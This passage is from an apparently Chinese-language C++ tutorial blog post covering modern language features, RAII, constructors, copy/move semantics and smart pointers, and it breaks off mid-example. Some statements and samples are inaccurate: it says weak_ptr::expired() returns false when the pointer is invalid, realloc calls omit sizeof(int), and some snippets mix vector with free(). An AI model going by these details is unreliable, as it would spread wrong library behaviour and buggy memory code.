Kernel","slug":"Linux-Kernel","permalink":"https://racleray.github.io/tags/Linux-Kernel/"}],"author":"HeRui"},{"title":"C++ Tips","slug":"C-Tips","date":"2023-02-16T13:07:45.000Z","updated":"2024-01-09T10:19:24.630Z","comments":true,"path":"posts/467a9cda.html","link":"","permalink":"https://racleray.github.io/posts/467a9cda.html","excerpt":"C++ 实践经验","text":"C++ New features C++11 引入了 {} 初始化表达式 C++11 引入了 range-based for-loop C++14 的 lambda 允许用 auto 自动推断传入参数类型 C++17 CTAD / compile-time argument deduction / 编译期参数推断 1234567891011121314151617#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;int main(int argc, char *argv[]) &#123; vector v = &#123;4,3,2,1&#125;; // 编译期参数推断 int sum; for_each(v.begin(),v.end(),[&amp;](auto vi)&#123; sum += vi; &#125;); cout &lt;&lt; sum &lt;&lt; endl; return 0;&#125; C++20 引入区间（ranges），g++ 编译时指定 -std=gnu20 123456789101112131415161718#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;numeric&gt;#include &lt;ranges&gt;#include &lt;cmath&gt;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125; return 0;&#125; C++20 引入模块（module） 123456789101112131415161718import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125; return 0;&#125; C++20 允许函数参数为自动推断（auto） 1234567891011121314151617181920import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;void myfunc(auto &amp;&amp;v) &#123; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125;&#125;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; myfunc(v); return 0;&#125; C++23 引入协程（coroutine）和生成器（generator），注意需要切换到最新的编译器 1234567891011121314151617181920212223import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;import &lt;generator&gt;;std::generator&lt;int&gt; myfunc(auto &amp;&amp;v) &#123; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; co_yield vi; &#125;&#125;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: myfunc(v)) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125; return 0;&#125; C++20 标准库加入 format 支持 123456789101112131415161718192021222324import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;import &lt;generator&gt;;import &lt;format&gt;;std::generator&lt;int&gt; myfunc(auto &amp;&amp;v) &#123; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; co_yield vi; &#125;&#125;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: myfunc(v)) &#123; std::format_to(std::cout, \"number is &#123;&#125;\\n\", vi); &#125; return 0;&#125; C++思想：封装 1234567891011121314151617181920212223#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main() &#123; //size_t nv = 4; //int *v = (int *)malloc(nv * sizeof(int)); std::vector&lt;int&gt; v(4); v[0] = 4; v[1] = 3; v[2] = 2; v[3] = 1; int sum = 0; for (size_t i = 0; i &lt; nv; i++) &#123; sum += v[i]; &#125; printf(\"%d\\n\", sum); free(v); return 0;&#125; 比如要表达一个数组，需要：起始地址指针v，数组大小nv。 因此 C++ 的 vector 将他俩打包起来，避免程序员犯错。 封装：不变性 当需要修改一个成员时，其他也成员需要被修改，否则出错 这种情况出现时，就意味着你需要把成员变量的读写封装为成员函数 12345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main() &#123; //size_t nv = 2; //int *v = (int *)malloc(nv * sizeof(int)); std::vector&lt;int&gt; v(2); v[0] = 4; v[1] = 3; //nv = 4; //v = (int *)realloc(v, nv * sizeof(int)); v.resize(4); v[2] = 2; v[3] = 1; int sum = 0; for (size_t i = 0; i &lt; nv; i++) &#123; sum += v[i]; &#125; printf(\"%d\\n\", sum); free(v); return 0;&#125; 仅当出现“修改一个成员时，其他也成员要被修改，否则出错”的现象时，才需要getter/setter 封装。 各个成员之间相互正交，比如数学矢量类 Vec3，就没必要去搞封装，只会让程序员变得痛苦，同时还有一定性能损失。特别是当 getter/setter 函数分离了声明和定义，实现在另一个文件时。 C++思想：RAII（Resource Acquisition Is Initialization） 资源获取视为初始化，反之，资源释放视为销毁 与 Java，Python 等垃圾回收语言不同，C++ 的解构函数是显式的，离开作用域自动销毁，毫不含糊（有好处也有坏处，对高性能计算而言利大于弊） 异常安全（exception-safe） C++ 标准保证当异常发生时，会调用已创建对象的解构函数。 因此 C++ 中没有（也不需要） finally 语句。 如果对时序有要求或对性能有要求就不能依靠 GC。比如 mutex 忘记 unlock 造成死锁等等…… 自定义构造函数 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; Pig() &#123; m_name = \"佩奇\"; m_weight = 80; &#125;&#125;;int main() &#123; Pig pig; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl; return 0;&#125; 为什么需要初始化表达式？ 假如类成员为 const 和引用 假如类成员没有无参构造函数 避免重复初始化，更高效 构造函数：单个参数（避免陷阱） 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; Pig(int weight) : m_name(\"一只重达\" + std::to_string(weight) + \"kg的猪\") , m_weight(weight) &#123;&#125;&#125;;int main() &#123; Pig pig = 80; // 编译通过 //Pig pig(80); std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl; return 0;&#125; 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; explicit Pig(int weight) : m_name(\"一只重达\" + std::to_string(weight) + \"kg的猪\") , m_weight(weight) &#123;&#125;&#125;;int main() &#123; // Pig pig = 80; // 编译错误 Pig pig(80); // 编译通过 std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl; return 0;&#125; 避免 80 被隐式转换为 pig 类，使用 explicit 禁止隐式类型转换。 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; explicit Pig(int weight) : m_name(\"一只重达\" + std::to_string(weight) + \"kg的猪\") , m_weight(weight) &#123;&#125;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; // show(80); // 编译错误 show(Pig(80)); // 编译通过 return 0;&#125; 比如 std::vector 的构造函数 vector(size_t n) 也是 explicit 的 使用 {} 和 () 调用构造函数，有什么区别？ int(3.14f) 不会出错，但是 int{3.14f} 会出错，因为 {} 是非强制转换。 Pig(“佩奇”, 3.14f) 不会出错，但是 Pig{“佩奇”, 3.14f} 会出错，原因同上，更安全。 可读性：Pig(1, 2) 则 Pig 有可能是个函数，Pig{1, 2} 看起来更明确。 在 C++ 中： 使用 static_cast&lt;int&gt;(3.14f) 而不是 int(3.14f) 使用 reinterpret_cast&lt;void &gt;(0xb8000) 而不是 (void )0xb8000 更加明确用的哪一种类型转换（cast），从而避免一些像是 static_cast(ptr) 的错误。 编译器默认生成的构造函数：无参数 默认生成的构造函数，这些类型不会被初始化为 0： 1.int, float, double 等基础类型 2.void , Object 等指针类型 3.完全由这些类型组成的类 这些类型被称为 POD（plain-old-data）. 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig; show(pig); return 0;&#125; 12name: weight: -265808448 可以手动指定初始化 weight 为0。 通过 {} 语法指定的初始化值，会在编译器自动生成的构造函数里执行。 1234struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;;&#125;; 12name: weight: 0 通过 {} 语法指定的初始化值，不仅会在编译器自动生成的构造函数里执行，也会在用户自定义构造函数里执行。 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig(std::string name) : m_name(name) &#123;&#125;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig(\"佩奇\"); show(pig); return 0;&#125; 12name: 佩奇weight: 0 类成员的 {} 中还可以有多个参数，甚至能用 =，当然 explicit 限制的构造函数除外。 除了不能用 () 之外，和函数局部变量的定义方式基本等价。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;struct Demo &#123; explicit Demo(std::string a, std::string b) &#123; std::cout &lt;&lt; \"Demo(\" &lt;&lt; a &lt;&lt; ',' &lt;&lt; b &lt;&lt; ')' &lt;&lt; std::endl; &#125;&#125;;struct Pig &#123; std::string m_name&#123;\"佩奇\"&#125;; int m_weight = 80; Demo m_demo&#123;\"Hello\", \"world\"&#125;; // 编译通过 // Demo m_demo = &#123;\"Hello\", \"world\"&#125;; // 编译出错&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig; show(pig); return 0;&#125; 另外： 12int x&#123;&#125;;void *p&#123;&#125;; 与 12int x&#123;0&#125;;void *p&#123;nullptr&#125;; 等价，都会零初始化。 std::cout &lt;&lt; int{}; 会打印出 0 当一个类（和他的基类）没有定义任何构造函数，这时编译器会自动生成一个参数个数和成员一样的构造函数。 他会将 {} 内的内容，会按顺序赋值给对象的每一个成员。目的是为了方便程序员不必手写冗长的构造函数一个个赋值给成员。 且初始化列表的构造函数只支持通过 {} 或 = {} 来构造，不支持通过 () 构造 （为了向下兼容 C++98） 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig1 = &#123;\"佩奇\", 80&#125;; // 编译通过 Pig pig2&#123;\"佩奇\", 80&#125;; // 编译通过 // Pig pig3(\"佩奇\", 80); // 编译错误！ show(pig1); return 0;&#125; 所以可以使用默认构造函数类，解决函数多返回值（妙用）。 12345678910111213141516171819struct &#123; bool hit; Vec3 pos; Vec3 normal; float depth;&#125; intersect(Ray r) &#123; ... return &#123;true, r.origin, r.direction, 233.0f&#125;;&#125;int main() &#123; Ray r; auto hit = intersect(r); if (hit.hit) &#123; r.origin = hit.pos; r.direction = hit.normal; ... &#125;&#125; 和 std::tuple 相比，最大的好处是每个属性都有名字，不容易搞错。 函数的参数，如果是很复杂的类型，你不想把类型名重复写一遍，也可以利用 {} 初始化列表来简化 123456789101112void func(std::tuple&lt;int, float, std::string&gt; arg, std::vector&lt;int&gt; arr) &#123; ...&#125;int main() &#123; func(&#123;1, 3.14f, \"佩奇\"&#125;, &#123;1, 4, 2, 8, 5, 7&#125;); // 等价于： func(std::tuple&lt;int, float, std::string&gt;(1, 3.14f, \"佩奇\"), std::vector&lt;int&gt;(&#123;1, 4, 2, 8, 5, 7&#125;)); // （C++17起）等价于： func(std::tuple(1, 3.14f, \"佩奇\"), std::vector(&#123;1, 4, 2, 8, 5, 7&#125;));&#125; 一旦我们定义了自己的构造函数，编译器就不会再生成默认的无参构造函数。 有自定义构造函数时仍想用默认构造函数：= default 12345678910struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig() = default; Pig(std::string name, int weight) : m_name(name), m_weight(weight) &#123;&#125;&#125;; 拷贝构造函数 编译器默认会生成拷贝构造函数：Pig(Pig const &amp;) 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig&#123;\"佩奇\", 80&#125;; show(pig); Pig pig2 = pig; // 调用 Pig(Pig const &amp;) // Pig pig2(pig); // 与上一种方式等价 show(pig); return 0;&#125; 拷贝赋值函数 编译器默认还会生成这样一个重载’=’这个运算符的函数： Pig &amp;operator=(Pig const &amp;other); 1234Pig pig = pig2; // 拷贝构造Pig pig; // 无参构造pig = pig2; // 拷贝赋值 追求性能时推荐用拷贝构造，因为可以避免一次无参构造，拷贝赋值是出于需要临时修改对象的灵活性需要。 如何避免不经意的隐式拷贝 将拷贝构造函数声明为 explicit 的，这样隐式的拷贝就会出错。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig(std::string name, int weight) : m_name(name), m_weight(weight) &#123;&#125; explicit Pig(Pig const &amp;other) = default;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig&#123;\"佩奇\", 80&#125;; // show(pig); // 编译错误 show(Pig&#123;pig&#125;); return 0;&#125; 自动生成的特殊函数 12345678910struct C &#123; C(); // 默认构造函数 C(C const &amp;c); // 拷贝构造函数 C(C &amp;&amp;c); // 移动构造函数（C++11 引入） C &amp;operator=(C const &amp;c); // 拷贝赋值函数 C &amp;operator=(C &amp;&amp;c); // 移动赋值函数（C++11 引入） ~C(); // 解构函数&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig(std::string name, int weight) : m_name(name), m_weight(weight) &#123;&#125; Pig() &#123;&#125; Pig(Pig const &amp;other) : m_name(other.m_name) , m_weight(other.m_weight) &#123;&#125; Pig &amp;operator=(Pig const &amp;other) &#123; m_name = other.m_name; m_weight = other.m_weight; return *this; &#125; Pig(Pig &amp;&amp;other) : m_name(std::move(other.m_name)) , m_weight(std::move(other.m_weight)) &#123;&#125; Pig &amp;operator=(Pig &amp;&amp;other) &#123; m_name = std::move(other.m_name); m_weight = std::move(other.m_weight); return *this; &#125; ~Pig() &#123;&#125;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig; show(pig); return 0;&#125; 如果其中一个成员（比如m_name）不支持拷贝构造函数，那么 Pig 类的拷贝构造函数将不会被编译器自动生成。 设计规则 经验 如果一个类定义了析构函数，那么您必须同时定义或删除 拷贝构造函数和拷贝赋值函数，否则出错。 如果一个类定义或删除了拷贝构造函数，那么您必须同时定义或删除 拷贝赋值函数，否则出错，删除可导致低效。 如果一个类定义了移动构造函数，那么您必须同时定义或删除 移动赋值函数，否则出错，删除可导致低效。 如果一个类定义了拷贝构造函数或拷贝赋值函数，那么您必须最好同时定义 移动构造函数或 移动赋值函数，否则低效。 例如： 在 = 时，默认是会拷贝的。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;struct Vector &#123; size_t m_size; int *m_data; Vector(size_t n) &#123; m_size = n; m_data = (int *)malloc(n * sizeof(int)); &#125; ~Vector() &#123; free(m_data); &#125; size_t size() &#123; return m_size; &#125; void resize(size_t size) &#123; m_size = size; m_data = (int *)realloc(m_data, m_size); &#125; int &amp;operator[](size_t index) &#123; return m_data[index]; &#125;&#125;;int main() &#123; Vector v1(32); Vector v2 = v1; // Vector v2(v1); // 与上一种等价 return 0; // 自动释放 v1, v2&#125; 1free(): double free detected in tcache 2 当前 Vector 的实现造成一个很大的问题：其 m_data 指针是按地址值浅拷贝的，而不深拷贝其指向的数组！ 在退出 main 函数作用域的时候，v1.m_data 会被释放两次！更危险的则是 v1 被解构而 v2 仍在被使用的情况。 这就是为什么“如果一个类定义了解构函数，那么您必须同时定义或删除拷贝构造函数和拷贝赋值函数，否则出错。” 最简单的办法是，直接禁止用户拷贝这个类的对象，在 C++11 中可以用 = delete 表示这个函数被删除，让编译器不要自动生成一个默认的（会导致指针浅拷贝的）拷贝构造函数了。 这样就可以在编译期提前发现错误 12345678910111213141516171819202122232425262728struct Vector &#123; size_t m_size; int *m_data; Vector(size_t n) &#123; m_size = n; m_data = (int *)malloc(n * sizeof(int)); &#125; ~Vector() &#123; free(m_data); &#125; Vector(Vector const &amp;other) = delete; size_t size() &#123; return m_size; &#125; void resize(size_t size) &#123; m_size = size; m_data = (int *)realloc(m_data, m_size); &#125; int &amp;operator[](size_t index) &#123; return m_data[index]; &#125;&#125;; 如果需要允许用户拷贝你的 Vector 类对象，保证任何单个操作前后，对象都是处于正确的状态，从而避免程序读到错误数据（如空悬指针）的情况。 1234567891011121314151617181920212223242526272829303132struct Vector &#123; size_t m_size; int *m_data; Vector(size_t n) &#123; m_size = n; m_data = (int *)malloc(n * sizeof(int)); &#125; ~Vector() &#123; free(m_data); &#125; Vector(Vector const &amp;other) &#123; m_size = other.m_size; m_data = (int *)malloc(m_size * sizeof(int)); memcpy(m_data, other.m_data, m_size * sizeof(int)); &#125; size_t size() &#123; return m_size; &#125; void resize(size_t size) &#123; m_size = size; m_data = (int *)realloc(m_data, m_size); &#125; int &amp;operator[](size_t index) &#123; return m_data[index]; &#125;&#125;; 区分拷贝构造和拷贝赋值 区分两种拷贝可以提高性能。 int x = 1; // 拷贝构造函数 x = 2; // 拷贝赋值函数 拷贝赋值函数 ≈ 解构函数 + 拷贝构造函数。 拷贝构造：直接未初始化的内存上构造 2 拷贝赋值：先销毁现有的 1，再重新构造 2 12345678910111213...Vector(Vector const &amp;other) &#123; m_size = other.m_size; m_data = (int *)malloc(m_size * sizeof(int)); memcpy(m_data, other.m_data, m_size * sizeof(int)); &#125; Vector &amp;operator=(Vector const &amp;other) &#123; this-&gt;~Vector(); // 先销毁现有的 new (this) Vector(other); // 再重新构造（placement new） return *this; // 支持连等号：v1 = v2 = v3 &#125;... 更高效的写法 123456Vector &amp;operator=(Vector const &amp;other) &#123; m_size = other.m_size; m_data = (int *)realloc(m_data, m_size * sizeof(int)); memcpy(m_data, other.m_data, m_size * sizeof(int)); return *this; &#125; 内存的销毁重新分配可以通过realloc，从而就地利用当前现有的m_data，避免重新分配。 拷贝和移动 时间复杂度：移动是 O(1)，拷贝是 O(n)。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;vector&gt;void test_copy() &#123; std::vector&lt;int&gt; v1(10); std::vector&lt;int&gt; v2(200); v1 = v2; // 拷贝赋值 O(n) std::cout &lt;&lt; \"after copy:\" &lt;&lt; std::endl; std::cout &lt;&lt; \"v1 length \" &lt;&lt; v1.size() &lt;&lt; std::endl; // 200 std::cout &lt;&lt; \"v2 length \" &lt;&lt; v2.size() &lt;&lt; std::endl; // 200&#125;void test_move() &#123; std::vector&lt;int&gt; v1(10); std::vector&lt;int&gt; v2(200); v1 = std::move(v2); // 移动赋值 O(1) std::cout &lt;&lt; \"after move:\" &lt;&lt; std::endl; std::cout &lt;&lt; \"v1 length \" &lt;&lt; v1.size() &lt;&lt; std::endl; // 200 std::cout &lt;&lt; \"v2 length \" &lt;&lt; v2.size() &lt;&lt; std::endl; // 0&#125;void test_swap() &#123; std::vector&lt;int&gt; v1(10); std::vector&lt;int&gt; v2(200); std::swap(v1, v2); // 交换两者 O(1) std::cout &lt;&lt; \"after swap:\" &lt;&lt; std::endl; std::cout &lt;&lt; \"v1 length \" &lt;&lt; v1.size() &lt;&lt; std::endl; // 200 std::cout &lt;&lt; \"v2 length \" &lt;&lt; v2.size() &lt;&lt; std::endl; // 10&#125;int main() &#123; test_copy(); test_move(); test_swap(); return 0;&#125; swap 可能是这样实现的： 123456template &lt;class T&gt;void swap(T&amp; t1, T&amp; t2) &#123; T tmp = std::move(t2); t2 = std::move(t1); t1 = std::move(tmp);&#125; swap 在高性能计算中可以用来实现双缓存（ping-pong buffer）。 哪些情况会触发“移动” 这些情况下编译器会调用移动： 123return v2; // v2 作返回值v1 = std::vector&lt;int&gt;(200); // 就地构造的 v2v1 = std::move(v2); // 显式地移动 这些情况下编译器会调用拷贝： 12return std::as_const(v2) // 显式地拷贝v1 = v2 // 默认拷贝 注意，下面两个语句没有任何作用： 这两个函数只是负责转换类型，实际产生移动/拷贝效果的是在类的构造/赋值函数里。 12std::move(v2) // 不会清空 v2，需要清空可以用 v2 = &#123;&#125; 或 v2.clear()std::as_const(v2) // 不会拷贝 v2，需要拷贝可以用 &#123; auto _ = v2; &#125; 移动构造函数 默认移动构造和移动赋值，编译器会自动这样做： 移动构造≈拷贝构造+他解构+他默认构造 移动赋值≈拷贝赋值+他解构+他默认构造 虽然低效，但至少可以保证不出错。 若自定义了移动构造，则： 移动赋值≈解构（当前自身的资源）+ 移动构造 123456789101112Vector(Vector &amp;&amp;other) &#123; m_size = other.m_size; other.m_size = 0; m_data = other.m_data; other.m_data = nullptr;&#125;Vector &amp;operator=(Vector &amp;&amp;other) &#123; this-&gt;~Vector(); new (this) Vector(std::move(other)); return *this;&#125; 如果有移动赋值函数，可以删除拷贝赋值函数。那么，当用户调用： 1v2 = v1; 时，因为拷贝赋值被删除，编译器会尝试： 1v2 = List(v1) 从而先调用拷贝构造函数（拷贝v1），然后因为 List(v1) 相当于就地构造的对象，从而变成了移动语义，从而进一步调用移动赋值函数。 智能指针 unique_ptr C++11 引入了 unique_ptr 容器，他的解构函数中会调用 delete p 12345678910111213141516171819202122232425#include &lt;cstdio&gt;#include &lt;cstdlib&gt;struct C &#123; C() &#123; printf(\"分配内存!\\n\"); &#125; ~C() &#123; printf(\"释放内存!\\n\"); &#125;&#125;;int main() &#123; C *p = new C; if (rand() != 0) &#123; printf(\"出了点小状况……\\n\"); // delete p; // 程序员粗心忘记释放指针 return 1; &#125; delete p; return 0;&#125; unique_ptr 则把下面连个操作封装成一个操作 12delete p;p = nullptr; 只需要： 1p = nullptr; // 等价于：p.reset() = nullptr 时，就释放了 unique_ptr 。 12345678910int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); if (1 + 1 == 2) &#123; printf(\"出了点小状况……\\n\"); return 1; // 自动释放 p &#125; return 0; // 自动释放 p&#125; 禁止拷贝 12345int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); func(p); // 出错 return 0;&#125; 因为 unique_ptr 删除了拷贝构造函数。如果要拷贝，有以下方法： 第一种是获取原始指针，你的 func() 实际上并不需要“夺走”资源的占有权（ownership）。 func() 只是调用了 p 的某个成员函数而已，并没有接过掌管对象生命周期的大权。 1234567891011121314151617181920212223242526#include &lt;cstdio&gt;#include &lt;memory&gt;struct C &#123; C() &#123; printf(\"分配内存!\\n\"); &#125; ~C() &#123; printf(\"释放内存!\\n\"); &#125; void do_something() &#123; printf(\"成员函数!\\n\"); &#125;&#125;;void func(C *p) &#123; p-&gt;do_something();&#125;int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); func(p.get()); return 0;&#125; 第二种是移动，你的 func() 需要“夺走”资源的占有权。 func 把指针放到一个全局的列表里，p 的生命周期将会变得和 objlist 一样长。因此需要接过掌管对象生命周期的大权。 12345678910111213141516171819202122232425262728293031#include &lt;cstdio&gt;#include &lt;memory&gt;#include &lt;vector&gt;struct C &#123; C() &#123; printf(\"分配内存!\\n\"); &#125; ~C() &#123; printf(\"释放内存!\\n\"); &#125; void do_something() &#123; printf(\"我的数字是 %d!\\n\", m_number); &#125;&#125;;std::vector&lt;std::unique_ptr&lt;C&gt;&gt; objlist;void func(std::unique_ptr&lt;C&gt; p) &#123; objlist.push_back(std::move(p)); // 进一步移动到 objlist&#125;int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); printf(\"移交前：%p\\n\", p.get()); // 不为 null func(std::move(p)); // 通过移动构造函数，转移指针控制权 printf(\"移交后：%p\\n\", p.get()); // null，因为移动会清除原对象 return 0;&#125; 1234分配内存!移交前：0x55ec91b162b0移交后：(nil)释放内存! 如果，移交控制权后仍希望访问到 p 指向的对象。最简单的办法是，在移交控制权给 func 前，提前通过 p.get() 获取原始指针。 12345678int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); func(std::move(p)); p-&gt;do_something(); // 出错，p 已经为空了！ return 0;&#125; 12345678910int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); C *raw_p = p.get(); func(std::move(p)); raw_p-&gt;do_something(); // 正常执行，raw_p 保留了转移前的指针 return 0;&#125; 不过你得保证 raw_p 的存在时间不超过 p 的生命周期，否则会出现危险的空悬指针。 1234567891011121314int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); C *raw_p = p.get(); func(std::move(p)); raw_p-&gt;do_something(); // 正常执行，raw_p 保留了转移前的指针 objlist.clear(); // 刚刚 p 移交给 func 的生命周期结束了！ raw_p-&gt;do_something(); // 错误！raw_p 指向的对象已经被释放！ return 0;&#125; 1234分配内存!我的数字是 42!释放内存!我的数字是 -803182608! shared_ptr 牺牲效率换来自由度的 shared_ptr 则允许拷贝，他解决重复释放的方式是通过引用计数。 当一个 shared_ptr 初始化时，将计数器设为1。 当一个 shared_ptr 被拷贝时，计数器加1。 当一个 shared_ptr 被解构时，计数器减1。减到0时，则自动销毁他指向的对象。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;cstdio&gt;#include &lt;memory&gt;#include &lt;vector&gt;struct C &#123; int m_number; C() &#123; printf(\"分配内存!\\n\"); m_number = 42; &#125; ~C() &#123; printf(\"释放内存!\\n\"); m_number = -2333333; &#125; void do_something() &#123; printf(\"我的数字是 %d!\\n\", m_number); &#125;&#125;;std::vector&lt;std::shared_ptr&lt;C&gt;&gt; objlist;void func(std::shared_ptr&lt;C&gt; p) &#123; objlist.push_back(std::move(p)); // 这里用移动可以更高效，但不必须&#125;int main() &#123; std::shared_ptr&lt;C&gt; p = std::make_shared&lt;C&gt;(); // 引用计数初始化为1 func(p); // shared_ptr 允许拷贝！和当前指针共享所有权，引用计数加1 func(p); // 多次也没问题~ 多个 shared_ptr 会共享所有权，引用计数加1 p-&gt;do_something(); // 正常执行，p 指向的地址本来就没有改变 objlist.clear(); // 刚刚 p 移交给 func 的生命周期结束了！引用计数减2 p-&gt;do_something(); // 正常执行，因为引用计数还剩1，不会被释放 return 0; // 到这里最后一个引用 p 也被释放，p 指向的对象才终于释放&#125; 只要还有存在哪怕一个指针指向该对象，就不会被解构。 可以使用 p.use_count() 来获取当前指针的引用计数。 注意 p.func() 是 shared_ptr 类型本身的成员函数，而 p-&gt;func() 是 p 指向对象（也就是 C）的成员函数，不要混淆。 weak_ptr 弱引用的拷贝与解构不影响其引用计数器。 可以通过 lock() 随时产生一个新的 shared_ptr 作为强引用。但不 lock 的时候不影响计数。 如果失效（计数器归零）则 expired() 会返回 false，且 lock() 也会返回 nullptr。 12345678910111213141516171819202122232425int main() &#123; std::shared_ptr&lt;C&gt; p = std::make_shared&lt;C&gt;(); // 引用计数初始化为1 printf(\"use count = %ld\\n\", p.use_count()); // 1 std::weak_ptr&lt;C&gt; weak_p = p; // 创建一个不影响计数器的弱引用 printf(\"use count = %ld\\n\", p.use_count()); // 1 func(std::move(p)); // 